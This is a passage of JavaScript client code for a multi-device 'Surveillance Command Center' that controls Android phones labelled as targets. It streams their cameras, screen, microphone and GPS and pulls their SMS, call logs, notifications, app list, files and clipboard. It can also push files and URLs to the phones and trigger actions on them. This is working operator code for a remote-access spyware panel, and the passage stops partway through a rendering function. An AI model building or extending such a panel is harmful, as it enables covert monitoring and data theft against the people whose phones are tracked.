// Surveillance Command Center - Multi-Device Client Logic

function getServerURL() {
  const hostname = window.location.hostname;
  if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
    return 'http://localhost:3000';
  }
  return window.location.origin;
}

const socket = io(getServerURL(), {
  reconnection: true,
  reconnectionAttempts: 25,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  randomizationFactor: 0.5
});

// ─────────────────────────────────────────────────────────────
// Multi-Device Registry & State Management
// ─────────────────────────────────────────────────────────────
const devices = new Map();
let selectedDeviceId = null;
let myId = null;

// Chunked File Transfer State
let activeDownloads = {};
let isTalkbackActive = false;
let localMicStream = null;
let localMicSender = null;

// WebRTC Configuration
const rtcConfig = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
  ]
};

// Global Map & Chart handles
let map = null;
let canvasCtx = null;
const maxHistoryPoints = 60;

// Modal Dispatch Helper
let currentModalAction = null;
let currentSnapshotBase64 = null;

// ─────────────────────────────────────────────────────────────
// DOM Element References
// ─────────────────────────────────────────────────────────────

// Top Bar Elements
const statusDiv = document.getElementById('status');
const retryButton = document.getElementById('retryButton');
const debugLog = document.getElementById('debugLog');
const remoteAudio = document.getElementById('remoteAudio');
const btnStreamMic = document.getElementById('btnStreamMic');
const talkbackToggle = document.getElementById('talkbackToggle');

// Left Devices Sidebar Elements
const deviceCountBadge = document.getElementById('deviceCountBadge');
const devicesList = document.getElementById('devicesList');
const devicesSearchInput = document.getElementById('devicesSearchInput');
const noDevicesNotice = document.getElementById('noDevicesNotice');

// Active Target Indicator
const activeDeviceName = document.getElementById('activeDeviceName');
const activeDeviceId = document.getElementById('activeDeviceId');
const telemetryTargetBadge = document.getElementById('telemetryTargetBadge');
const fsTargetBadge = document.getElementById('fsTargetBadge');

// Single Focus View Streams
const videoFront = document.getElementById('remoteVideoFront');
const videoBack = document.getElementById('remoteVideoBack');
const videoScreen = document.getElementById('remoteVideoScreen');
const cardScreenFeed = document.getElementById('cardScreenFeed');
const btnFullscreenScreen = document.getElementById('btnFullscreenScreen');
const tagFront = document.getElementById('tagFront');
const tagBack = document.getElementById('tagBack');
const tagScreen = document.getElementById('tagScreen');
const btnToggleFrontCam = document.getElementById('btnToggleFrontCam');
const btnStartFrontCamOverlay = document.getElementById('btnStartFrontCamOverlay');
const placeholderFront = document.getElementById('placeholderFront');
const btnToggleBackCam = document.getElementById('btnToggleBackCam');
const btnStartBackCamOverlay = document.getElementById('btnStartBackCamOverlay');
const placeholderBack = document.getElementById('placeholderBack');
const btnToggleScreen = document.getElementById('btnToggleScreen');
const btnStartScreenOverlay = document.getElementById('btnStartScreenOverlay');
const placeholderScreen = document.getElementById('placeholderScreen');
const btnSnapFront = document.getElementById('btnSnapFront');
const btnSnapBack = document.getElementById('btnSnapBack');
const btnSnapScreen = document.getElementById('btnSnapScreen');
const btnToggleLocation = document.getElementById('btnToggleLocation');
const tagLocation = document.getElementById('tagLocation');
const gpsIntervalSelect = document.getElementById('gpsIntervalSelect');
const btnRefreshLocation = document.getElementById('btnRefreshLocation');

// Sidebar Metrics
const infoModel = document.getElementById('infoModel');
const infoManufacturer = document.getElementById('infoManufacturer');
const infoVersion = document.getElementById('infoVersion');
const infoBattery = document.getElementById('infoBattery');
const infoBatteryDetails = document.getElementById('infoBatteryDetails');
const storageText = document.getElementById('storageText');
const storageProgress = document.getElementById('storageProgress');

// Hardware Controls
const volumeSlider = document.getElementById('volumeSlider');
const volumeVal = document.getElementById('volumeVal');
const brightnessSlider = document.getElementById('brightnessSlider');
const brightnessVal = document.getElementById('brightnessVal');
const flashlightToggle = document.getElementById('flashlightToggle');
const videoQualitySelect = document.getElementById('videoQualitySelect');

// Quick Action Buttons
const btnVibrate = document.getElementById('btnVibrate');
const btnRing = document.getElementById('btnRing');
const btnToast = document.getElementById('btnToast');
const btnOpenUrl = document.getElementById('btnOpenUrl');
const btnSwitchCamera = document.getElementById('btnSwitchCamera');
const btnRecord = document.getElementById('btnRecord');

// Telemetry Tabs
const tabNotifications = document.getElementById('tabNotifications');
const tabCalls = document.getElementById('tabCalls');
const tabSms = document.getElementById('tabSms');
const tabApps = document.getElementById('tabApps');

const paneNotifications = document.getElementById('paneNotifications');
const paneCalls = document.getElementById('paneCalls');
const paneSms = document.getElementById('paneSms');
const paneApps = document.getElementById('paneApps');

const notificationsList = document.getElementById('notificationList');
const callLogList = document.getElementById('callLogList');
const smsList = document.getElementById('smsList');
const appList = document.getElementById('appList');
const appSearchInput = document.getElementById('appSearchInput');
const btnRefreshApps = document.getElementById('btnRefreshApps');

// File Explorer
const fsPathInput = document.getElementById('fsPathInput');
const fsBackBtn = document.getElementById('fsBackBtn');
const fsGoBtn = document.getElementById('fsGoBtn');
const fileListDiv = document.getElementById('fileList');
const fsUploadArea = document.getElementById('fsUploadArea');
const fsUploadInput = document.getElementById('fsUploadInput');
const fsUploadLabel = document.getElementById('fsUploadLabel');
const fsUploadProgress = document.getElementById('fsUploadProgress');

// Sensors, Network, Clipboard, TTS, Modals
const sensorsToggle = document.getElementById('sensorsToggle');
const sensorLux = document.getElementById('sensorLux');
const sensorProximity = document.getElementById('sensorProximity');
const sensorAccel = document.getElementById('sensorAccel');
const btnRefreshNetwork = document.getElementById('btnRefreshNetwork');
const netSsid = document.getElementById('netSsid');
const netSpeed = document.getElementById('netSpeed');
const netIp = document.getElementById('netIp');
const netRssi = document.getElementById('netRssi');
const clipboardTextArea = document.getElementById('clipboardTextArea');
const btnFetchClipboard = document.getElementById('btnFetchClipboard');
const btnSetClipboard = document.getElementById('btnSetClipboard');
const snapshotModal = document.getElementById('snapshotModal');
const snapshotPreview = document.getElementById('snapshotPreview');
const btnDownloadSnapshot = document.getElementById('btnDownloadSnapshot');
const btnCloseSnapshot = document.getElementById('btnCloseSnapshot');
const btnScreenshot = document.getElementById('btnScreenshot');
const screenshotModal = document.getElementById('screenshotModal');
const screenshotPreview = document.getElementById('screenshotPreview');
const btnDownloadScreenshot = document.getElementById('btnDownloadScreenshot');
const btnCloseScreenshot = document.getElementById('btnCloseScreenshot');
let currentScreenshotBase64 = null;
const ttsText = document.getElementById('ttsText');
const ttsPitch = document.getElementById('ttsPitch');
const ttsPitchVal = document.getElementById('ttsPitchVal');
const ttsSpeed = document.getElementById('ttsSpeed');
const ttsSpeedVal = document.getElementById('ttsSpeedVal');
const btnTtsSpeak = document.getElementById('btnTtsSpeak');
const dialogOverlay = document.getElementById('dialogOverlay');
const dialogTitle = document.getElementById('dialogTitle');
const dialogDesc = document.getElementById('dialogDesc');
const dialogInput = document.getElementById('dialogInput');
const dialogBtnCancel = document.getElementById('dialogBtnCancel');
const dialogBtnConfirm = document.getElementById('dialogBtnConfirm');

// ─────────────────────────────────────────────────────────────
// Diagnostics & Logging Helpers
// ─────────────────────────────────────────────────────────────

function updateStatus(message) {
  console.log(message);
  if (statusDiv) statusDiv.textContent = message;
  logDebug(message);
  if (retryButton) {
    retryButton.style.display = (message.includes('Failed') || message.includes('disconnected')) ? 'block' : 'none';
  }
}

function logDebug(message) {
  if (!debugLog) return;
  const logEntry = document.createElement('div');
  logEntry.className = 'terminal-entry';
  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
  debugLog.prepend(logEntry);
  while (debugLog.children.length > 70) {
    debugLog.removeChild(debugLog.lastChild);
  }
}

function escapeHtml(str) {
  if (!str) return '';
  return str.toString()
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function formatBytes(bytes) {
  if (bytes === 0 || !bytes) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ─────────────────────────────────────────────────────────────
// Device Lifecycle & Registry Management
// ─────────────────────────────────────────────────────────────

function getOrCreateDevice(deviceId) {
  if (!deviceId) return null;
  if (devices.has(deviceId)) {
    return devices.get(deviceId);
  }

  logDebug(`[REGISTRY] Registering new device target: ${deviceId}`);

  // Create dedicated audio sink for this device
  let audioEl = document.getElementById(`audio-${deviceId}`);
  if (!audioEl) {
    audioEl = document.createElement('audio');
    audioEl.id = `audio-${deviceId}`;
    audioEl.autoplay = true;
    audioEl.playsInline = true;
    audioEl.style.display = 'none';
    document.body.appendChild(audioEl);
  }

  const dev = {
    id: deviceId,
    info: {
      model: 'Android Device',
      manufacturer: 'Android',
      version: '—',
      battery: 100,
      batteryTemp: 0,
      chargingSource: 'unplugged',
      storageTotal: 0,
      storageFree: 0,
      recording: false
    },
    peer: null,
    frontTrack: null,
    backTrack: null,
    screenTrack: null,
    audioTrack: null,
    isFrontStreaming: false,
    isBackStreaming: false,
    isScreenStreaming: false,
    isMicStreaming: false,
    isLocationStreaming: false,
    isRecording: false,
    isSensorsActive: false,
    location: null,
    marker: null,
    notifications: [],
    callLogs: [],
    smsMessages: [],
    apps: [],
    currentPath: '/storage/emulated/0/',
    files: [],
    network: null,
    sensors: null,
    sensorHistory: [],
    clipboard: '',
    volume: 50,
    brightness: 50,
    flashlight: false,
    quality: 'medium'
  };

  devices.set(deviceId, dev);

  // If no device currently selected, select this one
  if (!selectedDeviceId) {
    selectDevice(deviceId);
  } else {
    renderDevicesList();
  }

  return dev;
}

function selectDevice(deviceId) {
  if (!deviceId || !devices.has(deviceId)) {
    if (devices.size > 0) {
      deviceId = Array.from(devices.keys())[0];
    } else {
      selectedDeviceId = null;
      renderDevicesList();
      resetSidebarToDefault();
      return;
    }
  }

  selectedDeviceId = deviceId;
  const dev = devices.get(deviceId);
  logDebug(`[ACTIVE] Selected device target: ${dev.info.model || deviceId} (${deviceId})`);

  // Update Devices Sidebar
  renderDevicesList();

  // Update Active Banner & Labels
  const title = dev.info.model || `Device ${deviceId.substring(0, 6)}`;
  if (activeDeviceName) activeDeviceName.textContent = title;
  if (activeDeviceId) activeDeviceId.textContent = deviceId;
  if (telemetryTargetBadge) telemetryTargetBadge.textContent = `Target: ${title}`;
  if (fsTargetBadge) fsTargetBadge.textContent = `Target: ${title}`;

  // Sync Sidebar Metrics
  if (infoModel) infoModel.textContent = dev.info.model || '—';
  if (infoManufacturer) infoManufacturer.textContent = dev.info.manufacturer || '—';
  if (infoVersion) infoVersion.textContent = dev.info.version ? `Android ${dev.info.version}` : '—';
  if (infoBattery) {
    infoBattery.textContent = `${dev.info.battery}%`;
    if (dev.info.battery <= 15) infoBattery.style.color = 'var(--danger)';
    else if (dev.info.battery <= 35) infoBattery.style.color = 'var(--warning)';
    else infoBattery.style.color = 'var(--success)';
  }
  if (infoBatteryDetails) {
    infoBatteryDetails.textContent = dev.info.batteryTemp ? `${dev.info.batteryTemp}°C • ${dev.info.chargingSource}` : '—';
  }
  if (storageText && storageProgress) {
    if (dev.info.storageTotal) {
      const occupied = (dev.info.storageTotal - dev.info.storageFree).toFixed(1);
      storageText.textContent = `${occupied} GB / ${dev.info.storageTotal} GB`;
      const pct = Math.min(100, Math.max(0, ((occupied / dev.info.storageTotal) * 100).toFixed(0)));
      storageProgress.style.width = `${pct}%`;
    } else {
      storageText.textContent = '0 GB / 0 GB';
      storageProgress.style.width = '0%';
    }
  }

  // Sync Hardware Controls
  if (volumeSlider) volumeSlider.value = dev.volume;
  if (volumeVal) volumeVal.textContent = `${dev.volume}%`;
  if (brightnessSlider) brightnessSlider.value = dev.brightness;
  if (brightnessVal) brightnessVal.textContent = `${dev.brightness}%`;
  if (flashlightToggle) flashlightToggle.checked = !!dev.flashlight;
  if (sensorsToggle) sensorsToggle.checked = !!dev.isSensorsActive;
  if (videoQualitySelect) videoQualitySelect.value = dev.quality || 'medium';
  if (clipboardTextArea) clipboardTextArea.value = dev.clipboard || '';

  // Update Recording Button
  updateRecordingButton(dev.isRecording);

  // Sync Network Info
  if (dev.network) {
    if (netSsid) netSsid.textContent = dev.network.ssid || '—';
    if (netSpeed) netSpeed.textContent = dev.network.linkSpeed ? `${dev.network.linkSpeed} Mbps` : '—';
    if (netIp) netIp.textContent = dev.network.localIp || '—';
    if (netRssi) netRssi.textContent = dev.network.rssi ? `${dev.network.rssi} dBm` : '—';
  } else {
    if (netSsid) netSsid.textContent = '—';
    if (netSpeed) netSpeed.textContent = '—';
    if (netIp) netIp.textContent = '—';
    if (netRssi) netRssi.textContent = '—';
  }

  // Sync Sensors
  if (dev.sensors) {
    if (sensorLux) sensorLux.textContent = dev.sensors.lux !== undefined ? `${dev.sensors.lux.toFixed(0)} Lux` : '—';
    if (sensorProximity) sensorProximity.textContent = dev.sensors.proximity === 0.0 ? 'NEAR (0cm)' : 'FAR (normal)';
    if (sensorAccel) sensorAccel.textContent = `X:${dev.sensors.accelX?.toFixed(1) || 0} Y:${dev.sensors.accelY?.toFixed(1) || 0} Z:${dev.sensors.accelZ?.toFixed(1) || 0}`;
  } else {
    if (sensorLux) sensorLux.textContent = '—';
    if (sensorProximity) sensorProximity.textContent = '—';
    if (sensorAccel) sensorAccel.textContent = '—';
  }
  drawSensorChart();

  // Sync Telemetry Lists
  renderNotifications(dev.notifications);
  renderCallLogs(dev.callLogs);
  renderSmsMessages(dev.smsMessages);
  renderAppsList(dev.apps);

  // Sync File Explorer
  if (fsPathInput) fsPathInput.value = dev.currentPath || '/storage/emulated/0/';
  if (dev.files && dev.files.length > 0) {
    renderFileList(dev.files, dev.currentPath);
  } else {
    requestFileList(dev.currentPath, dev.id);
  }

  // Sync Focused Streams & Location
  updateFocusStreams();
  updateAudioStream();
  updateLocationUI();

  // Center map on this device if location known
  if (map && dev.location) {
    map.setView([dev.location.latitude, dev.location.longitude], 15);
  }
}

// Global hook for popup clicks
window.selectDevice = selectDevice;

function removeDevice(deviceId) {
  const dev = devices.get(deviceId);
  if (!dev) return;

  logDebug(`[REGISTRY] Disconnecting device: ${dev.info.model || deviceId} (${deviceId})`);

  if (dev.peer) {
    try { dev.peer.close(); } catch(e) {}
    dev.peer = null;
  }

  if (dev.marker) {
    try { dev.marker.remove(); } catch(e) {}
    dev.marker = null;
  }

  const audioEl = document.getElementById(`audio-${deviceId}`);
  if (audioEl) audioEl.remove();

  const card = document.getElementById(`card-${deviceId}`);
  if (card) card.remove();

  devices.delete(deviceId);

  if (selectedDeviceId === deviceId) {
    const remaining = Array.from(devices.keys());
    selectedDeviceId = remaining.length > 0 ? remaining[0] : null;
  }

  renderDevicesList();

  if (selectedDeviceId) {
    selectDevice(selectedDeviceId);
  } else {
    resetSidebarToDefault();
  }
}

function resetSidebarToDefault() {
  if (activeDeviceName) activeDeviceName.textContent = 'No Device Selected';
  if (activeDeviceId) activeDeviceId.textContent = '—';
  if (telemetryTargetBadge) telemetryTargetBadge.textContent = 'Target: None';
  if (fsTargetBadge) fsTargetBadge.textContent = 'Target: None';

  if (infoModel) infoModel.textContent = '—';
  if (infoManufacturer) infoManufacturer.textContent = '—';
  if (infoVersion) infoVersion.textContent = '—';
  if (infoBattery) { infoBattery.textContent = '—'; infoBattery.style.color = 'var(--text-main)'; }
  if (infoBatteryDetails) infoBatteryDetails.textContent = '—';
  if (storageText) storageText.textContent = '0 GB / 0 GB';
  if (storageProgress) storageProgress.style.width = '0%';

  if (notificationsList) notificationsList.innerHTML = '';
  if (callLogList) callLogList.innerHTML = '';
  if (smsList) smsList.innerHTML = '';
  if (appList) appList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No devices connected.</div>';
  if (fileListDiv) fileListDiv.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 40px; font-size: 0.85rem;">Waiting for device connection...</div>';

  updateFocusStreams();
  updateAudioStream();
  updateLocationUI();
}

function updateRecordingButton(isRecording) {
  if (!btnRecord) return;
  if (isRecording) {
    btnRecord.classList.add('active');
    btnRecord.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 10a1 1 0 011-1h4a1 1 0 011 1v4a1 1 0 01-1 1h-4a1 1 0 01-1-1v-4z"/></svg> Stop Rec`;
  } else {
    btnRecord.classList.remove('active');
    btnRecord.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg> Record MP4`;
  }
}

// ─────────────────────────────────────────────────────────────
// UI Renderers: Left Devices Sidebar & Single Selected Device Feeds
// ─────────────────────────────────────────────────────────────

function renderDevicesList() {
  if (!devicesList || !deviceCountBadge) return;

  const count = devices.size;
  deviceCountBadge.textContent = `${count} Online`;

  const query = (devicesSearchInput?.value || '').trim().toLowerCase();

  if (count === 0) {
    devicesList.innerHTML = `
      <div id="noDevicesNotice" class="devices-empty-state">
        <div style="font-size: 1.8rem; margin-bottom: 8px;">📱</div>
        <div style="font-weight: 600; color: var(--text-main); margin-bottom: 4px; font-size: 0.85rem;">No Devices Connected</div>
        <div style="font-size: 0.72rem; color: var(--text-muted); line-height: 1.4;">Install & open the app on your Android devices to connect.</div>
      </div>
    `;
    return;
  }

  devicesList.innerHTML = '';
  let visibleCount = 0;

  devices.forEach((dev) => {
    const model = dev.info.model || 'Android Target';
    const manufacturer = dev.info.manufacturer || 'Android';
    const idShort = dev.id.substring(0, 8);

    if (query && !model.toLowerCase().includes(query) && !manufacturer.toLowerCase().includes(query) && !dev.id.toLowerCase().includes(query)) {
      return;
    }

    visibleCount++;
    const isSelected = dev.id === selectedDeviceId;
    const isStreaming = dev.isFrontStreaming || dev.isBackStreaming || dev.isScreenStreaming;

    const item = document.createElement('div');
    item.className = `device-item ${isSelected ? 'active' : ''}`;
    item.setAttribute('data-device-id', dev.id);

    let battColor = 'var(--success)';
    if (dev.info.battery <= 15) battColor = 'var(--danger)';
    else if (dev.info.battery <= 35) battColor = 'var(--warning)';

    item.innerHTML = `
      <div class="device-item-icon">
        📱
      </div>
      <div class="device-item-info">
        <div class="device-item-name" title="${escapeHtml(model)}">
          ${escapeHtml(model)}
        </div>
        <div class="device-item-sub">
          <span>${escapeHtml(manufacturer)}</span>
          <span>•</span>
          <span style="font-family: var(--font-mono); color: var(--primary);">${idShort}</span>
        </div>
      </div>
      <div class="device-item-status">
        <div class="device-item-battery" style="color: ${battColor};">🔋 ${dev.info.battery}%</div>
        ${isStreaming 
          ? '<span class="device-item-live-tag">LIVE</span>' 
          : '<span class="device-item-live-dot idle" title="Standby"></span>'}
      </div>
    `;

    item.addEventListener('click', () => {
      selectDevice(dev.id);
    });

    devicesList.appendChild(item);
  });

  if (visibleCount === 0 && query) {
    devicesList.innerHTML = `
      <div style="padding: 24px 12px; text-align: center; color: var(--text-muted); font-size: 0.8rem;">
        No devices matching "${escapeHtml(query)}"
      </div>
    `;
  }
}

// Live Search Filter for Devices Sidebar
devicesSearchInput?.addEventListener('input', () => {
  renderDevicesList();
});

function updateFocusStreams() {
  const dev = selectedDeviceId ? devices.get(selectedDeviceId) : null;

  if (dev && dev.frontTrack && dev.isFrontStreaming) {
    if (!videoFront.srcObject || videoFront.srcObject.getVideoTracks()[0] !== dev.frontTrack) {
      videoFront.srcObject = new MediaStream([dev.frontTrack]);
    }
    if (placeholderFront) placeholderFront.classList.add('hidden');
    if (tagFront) { tagFront.textContent = 'FRONT LIVE'; tagFront.className = 'feed-live-tag tag-active'; }
    if (btnToggleFrontCam) { btnToggleFrontCam.textContent = '⏹ Stop'; btnToggleFrontCam.classList.remove('btn-primary'); }
    videoFront.play().catch(e => console.log('Autoplay front focus blocked', e));
  } else {
    videoFront.srcObject = null;
    if (placeholderFront) placeholderFront.classList.remove('hidden');
    if (tagFront) { tagFront.textContent = 'OFFLINE'; tagFront.className = 'feed-live-tag tag-offline'; }
    if (btnToggleFrontCam) { btnToggleFrontCam.textContent = '▶ Stream'; btnToggleFrontCam.classList.add('btn-primary'); }
  }

  if (dev && dev.backTrack && dev.isBackStreaming) {
    if (!videoBack.srcObject || videoBack.srcObject.getVideoTracks()[0] !== dev.backTrack) {
      videoBack.srcObject = new MediaStream([dev.backTrack]);
    }
    if (placeholderBack) placeholderBack.classList.add('hidden');
    if (tagBack) { tagBack.textContent = 'BACK LIVE'; tagBack.className = 'feed-live-tag tag-active'; }
    if (btnToggleBackCam) { btnToggleBackCam.textContent = '⏹ Stop'; btnToggleBackCam.classList.remove('btn-primary'); }
    videoBack.play().catch(e => console.log('Autoplay back focus blocked', e));
  } else {
    videoBack.srcObject = null;
    if (placeholderBack) placeholderBack.classList.remove('hidden');
    if (tagBack) { tagBack.textContent = 'OFFLINE'; tagBack.className = 'feed-live-tag tag-offline'; }
    if (btnToggleBackCam) { btnToggleBackCam.textContent = '▶ Stream'; btnToggleBackCam.classList.add('btn-primary'); }
  }

  const isScreenActive = !!(dev && dev.isScreenStreaming);

  if (cardScreenFeed) {
    if (isScreenActive) {
      cardScreenFeed.classList.add('screen-active');
    } else {
      cardScreenFeed.classList.remove('screen-active');
    }
  }

  if (isScreenActive && dev && dev.screenTrack) {
    if (!videoScreen.srcObject || videoScreen.srcObject.getVideoTracks()[0] !== dev.screenTrack) {
      videoScreen.srcObject = new MediaStream([dev.screenTrack]);
    }
    if (placeholderScreen) placeholderScreen.classList.add('hidden');
    if (tagScreen) { tagScreen.textContent = 'SCREEN LIVE'; tagScreen.className = 'feed-live-tag tag-active'; }
    if (btnToggleScreen) { btnToggleScreen.textContent = '⏹ Stop'; btnToggleScreen.classList.remove('btn-primary'); }
    videoScreen.play().catch(e => console.log('Autoplay screen focus blocked', e));
  } else if (isScreenActive) {
    if (videoScreen) videoScreen.srcObject = null;
    if (placeholderScreen) placeholderScreen.classList.remove('hidden');
    if (tagScreen) { tagScreen.textContent = 'CONNECTING...'; tagScreen.className = 'feed-live-tag tag-active'; }
    if (btnToggleScreen) { btnToggleScreen.textContent = '⏹ Stop'; btnToggleScreen.classList.remove('btn-primary'); }
  } else {
    if (videoScreen) videoScreen.srcObject = null;
    if (placeholderScreen) placeholderScreen.classList.remove('hidden');
    if (tagScreen) { tagScreen.textContent = 'OFFLINE'; tagScreen.className = 'feed-live-tag tag-offline'; }
    if (btnToggleScreen) { btnToggleScreen.textContent = '▶ Stream'; btnToggleScreen.classList.add('btn-primary'); }
  }
}

function updateAudioStream() {
  const dev = selectedDeviceId ? devices.get(selectedDeviceId) : null;
  if (!remoteAudio) return;

  if (dev && dev.audioTrack && dev.isMicStreaming) {
    if (!remoteAudio.srcObject || remoteAudio.srcObject.getAudioTracks()[0] !== dev.audioTrack) {
      remoteAudio.srcObject = new MediaStream([dev.audioTrack]);
    }
    remoteAudio.play().catch(e => console.log('Focus audio playback blocked', e));
    if (btnStreamMic) {
      btnStreamMic.textContent = '🔊 Listening (Mic ON)';
      btnStreamMic.style.color = '#10b981';
      btnStreamMic.style.borderColor = '#10b981';
      btnStreamMic.style.background = 'rgba(16, 185, 129, 0.15)';
    }
  } else {
    remoteAudio.srcObject = null;
    if (btnStreamMic) {
      btnStreamMic.textContent = '🎧 Listen: OFF';
      btnStreamMic.style.color = 'var(--text-muted)';
      btnStreamMic.style.borderColor = 'rgba(255,255,255,0.08)';
      btnStreamMic.style.background = 'transparent';
    }
  }
}

function updateLocationUI() {
  const dev = selectedDeviceId ? devices.get(selectedDeviceId) : null;
  if (!tagLocation || !btnToggleLocation) return;

  if (dev && dev.isLocationStreaming) {
    tagLocation.textContent = 'GPS LIVE';
    tagLocation.className = 'feed-live-tag tag-active';
    btnToggleLocation.textContent = '⏹ Stop GPS';
    btnToggleLocation.classList.remove('btn-primary');
  } else {
    tagLocation.textContent = 'GPS OFF';
    tagLocation.className = 'feed-live-tag tag-offline';
    btnToggleLocation.textContent = '▶ Stream GPS';
    btnToggleLocation.classList.add('btn-primary');
  }
}

// ─────────────────────────────────────────────────────────────
// Map Integration with Multi-Device Markers
// ─────────────────────────────────────────────────────────────

function initMap() {
  if (map) return;
  try {
    const mapEl = document.getElementById('mapContainer');
    if (!mapEl) return;
    map = L.map('mapContainer', { zoomControl: false }).setView([20, 0], 2);
    L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
      maxZoom: 19,
      attribution: '&copy; OpenStreetMap'
    }).addTo(map);
    L.control.zoom({ position: 'bottomright' }).addTo(map);
    logDebug('[MAP] Leaflet map initialized');
  } catch (e) {
    console.error('Map init failed:', e);
  }
}

function updateDeviceLocation(deviceId, lat, lng) {
  const dev = devices.get(deviceId);
  if (!dev) return;

  dev.location = { latitude: lat, longitude: lng };
  if (!map) initMap();

  try {
    const title = dev.info.model || `Device ${deviceId.substring(0, 6)}`;
    const popupContent = `
      <div style="font-family: sans-serif; font-size: 12px; color: #111; line-height: 1.4;">
        <b>${escapeHtml(title)}</b><br>
        Battery: <b>${dev.info.battery}%</b><br>
        Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}<br>
        <button onclick="window.selectDevice('${deviceId}')" style="margin-top: 6px; padding: 4px 10px; font-size: 11px; cursor: pointer; border-radius: 4px; border: 1px solid #333; background: #00f0ff; color: #000; font-weight: bold;">Select Target</button>
      </div>
    `;

    if (dev.marker) {
      dev.marker.setLatLng([lat, lng]);
      dev.marker.setPopupContent(popupContent);
    } else {
      dev.marker = L.marker([lat, lng]).addTo(map);
      dev.marker.bindPopup(popupContent);
    }

    if (selectedDeviceId === deviceId) {
      map.setView([lat, lng], 15);
    }
    logDebug(`[MAP] [${title}] Target coordinates: lat=${lat.toFixed(5)}, lng=${lng.toFixed(5)}`);
  } catch (e) {
    console.error('Map marker update failed:', e);
  }
}

// ─────────────────────────────────────────────────────────────
// Sensor Chart Renderer
// ─────────────────────────────────────────────────────────────

function initSensorChart() {
  const canvas = document.getElementById('sensorChart');
  if (canvas) {
    canvasCtx = canvas.getContext('2d');
  }
}

function drawSensorChart() {
  if (!canvasCtx) return;
  const canvas = canvasCtx.canvas;
  const w = canvas.width;
  const h = canvas.height;

  canvasCtx.fillStyle = '#0a0d14';
  canvasCtx.fillRect(0, 0, w, h);

  const dev = selectedDeviceId ? devices.get(selectedDeviceId) : null;
  const history = dev ? dev.sensorHistory : [];
  if (history.length === 0) return;

  const step = w / maxHistoryPoints;

  // Draw grid
  canvasCtx.strokeStyle = 'rgba(255, 255, 255, 0.03)';
  canvasCtx.lineWidth = 1;
  for (let i = 0; i < maxHistoryPoints; i += 10) {
    const x = i * step;
    canvasCtx.beginPath();
    canvasCtx.moveTo(x, 0);
    canvasCtx.lineTo(x, h);
    canvasCtx.stroke();
  }

  const drawLine = (valExtractor, color) => {
    canvasCtx.strokeStyle = color;
    canvasCtx.lineWidth = 1.5;
    canvasCtx.beginPath();
    history.forEach((pt, idx) => {
      const val = valExtractor(pt);
      const y = h/2 - (val / 15) * (h/2);
      const x = idx * step;
      if (idx === 0) canvasCtx.moveTo(x, y);
      else canvasCtx.lineTo(x, y);
    });
    canvasCtx.stroke();
  };

  // Render Lux
  canvasCtx.strokeStyle = '#10b981';
  canvasCtx.lineWidth = 1.5;
  canvasCtx.beginPath();
  history.forEach((pt, idx) => {
    const lux = pt.lux || 0;
    const normLux = Math.min(1, Math.log10(lux + 1) / 4);
    const y = h - normLux * (h - 10) - 5;
    const x = idx * step;
    if (idx === 0) canvasCtx.moveTo(x, y);
    else canvasCtx.lineTo(x, y);
  });
  canvasCtx.stroke();

  drawLine(pt => pt.accelX || 0, '#ef4444');
  drawLine(pt => pt.accelY || 0, '#f59e0b');
  drawLine(pt => pt.accelZ || 0, '#3b82f6');
}

// ─────────────────────────────────────────────────────────────
// Telemetry Tab Rendering (Notifications, Calls, SMS, Apps)
// ─────────────────────────────────────────────────────────────

function switchTab(activeTab, activePane) {
  [tabNotifications, tabCalls, tabSms, tabApps].forEach(t => t?.classList.remove('active'));
  [paneNotifications, paneCalls, paneSms, paneApps].forEach(p => { if (p) p.style.display = 'none'; });

  activeTab?.classList.add('active');
  if (activePane) {
    activePane.style.display = activePane === paneApps ? 'flex' : 'block';
  }
}

tabNotifications?.addEventListener('click', () => switchTab(tabNotifications, paneNotifications));
tabCalls?.addEventListener('click', () => switchTab(tabCalls, paneCalls));
tabSms?.addEventListener('click', () => switchTab(tabSms, paneSms));
tabApps?.addEventListener('click', () => {
  switchTab(tabApps, paneApps);
  if (selectedDeviceId) {
    const dev = devices.get(selectedDeviceId);
    if (dev && dev.apps.length === 0) {
      socket.emit('cmd:get_apps', { to: selectedDeviceId });
    }
  }
});

btnRefreshApps?.addEventListener('click', () => {
  if (!selectedDeviceId) return;
  logDebug(`[CMD] Syncing applications for target: ${selectedDeviceId}`);
  socket.emit('cmd:get_apps', { to: selectedDeviceId });
});

appSearchInput?.addEventListener('input', (e) => {
  const query = e.target.value.toLowerCase();
  const appItems = appList.querySelectorAll('.data-item');
  appItems.forEach(item => {
    const text = item.textContent.toLowerCase();
    item.style.display = text.includes(query) ? 'flex' : 'none';
  });
});

function renderNotifications(list) {
  if (!notificationsList) return;
  notificationsList.innerHTML = '';
  if (!list || list.length === 0) {
    notificationsList.innerHTML = '<div style="color: var(--text-muted); padding: 14px; font-size: 0.85rem;">No notification events captured yet.</div>';
    return;
  }
  list.forEach(notif => {
